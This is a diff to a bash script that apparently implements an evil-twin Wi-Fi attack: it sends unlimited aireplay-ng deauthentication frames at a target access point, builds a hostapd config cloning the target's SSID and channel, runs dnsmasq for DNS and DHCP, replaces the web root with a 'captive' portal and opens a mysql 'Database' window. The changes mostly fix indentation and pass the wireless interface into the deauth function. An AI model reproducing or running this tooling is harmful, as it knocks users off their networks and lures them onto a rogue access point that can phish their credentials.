@@ -200,14 +200,11 @@ selectNetwork () {
 }
 
 deauth(){
-        if [ $ok -eq 1 ]
-        then
-		iwconfig "$interface2" channel "$2"
-                echo
-                echo "Press enter to deauth"
-                read ola
-                aireplay-ng -0 0 -a "$1" "$interface2"
-        fi
+	iwconfig "$3" channel "$2"
+        echo
+        echo "Press enter to deauth"
+        read ola
+        aireplay-ng -0 0 -a "$1" "$3"
 }
 
 selectNetworkInterface
@@ -309,13 +306,13 @@ then
 	        then
 
 	                echo "interface=$interface
-	driver=nl80211
-	ssid=$essid
-	hw_mode=g
-	channel=$channel
-	macaddr_acl=0
-	auth_algs=1
-	ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
+driver=nl80211
+ssid=$essid
+hw_mode=g
+channel=$channel
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
 
 	        else
 
@@ -323,22 +320,22 @@ then
 			echo
 
 	        	echo "interface=$interface
-	driver=nl80211
-	ssid=$essid
-	hw_mode=g
-	wpa=2
-	wpa_passphrase=$pass
-	wpa_key_mgmt=WPA-PSK WPA-PSK-SHA256
-	channel=$channel
-	macaddr_acl=0
-	ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
+driver=nl80211
+ssid=$essid
+hw_mode=g
+wpa=2
+wpa_passphrase=$pass
+wpa_key_mgmt=WPA-PSK WPA-PSK-SHA256
+channel=$channel
+macaddr_acl=0
+ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
 
 	        fi
 
 		gnome-terminal --geometry 117x24+0+0 -e "bash -c \"clear; hostapd $tempFolder/hostapd.conf; exec bash\"" -q -t "$essid $channel"
 		clear
 
-	########################## DNSMASQ CONFIG (DNS & DHCP) ###############################
+########################## DNSMASQ CONFIG (DNS & DHCP) ###############################
 
 		# Stops dnsmasq daemon on port 53
 		service dnsmasq stop
@@ -386,7 +383,7 @@ then
 
 		gnome-terminal --geometry 117x25+0+600 -e "bash -c \"clear; dnsmasq -C $tempFolder/dnsmasq.conf -H $tempFolder/hosts -d; exec bash\"" -q -t "DHCP"
 
-	################################### WEB FILES #########################################
+################################### WEB FILES #########################################
 
 		rm -r /var/www/html/*
 		cp -r captive /var/www/html/captive
@@ -414,7 +411,8 @@ then
 	                export -f selectNetworkInterface2
 			export $bssid
 			export $channel
-	                gnome-terminal --geometry 117x25+1000+600 -e "bash -c \"deauth \"$bssid\" \"$channel\"; exec bash\"" -q -t "Deauth $essid ($bssid) channel $channel"
+	                export $interface2
+			gnome-terminal --geometry 117x25+1000+600 -e "bash -c \"deauth \"$bssid\" \"$channel\" \"$interface2\"; exec bash\"" -q -t "Deauth $essid ($bssid) channel $channel"
 			export -f titulo
 			gnome-terminal --geometry 117x25+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database"
 		else
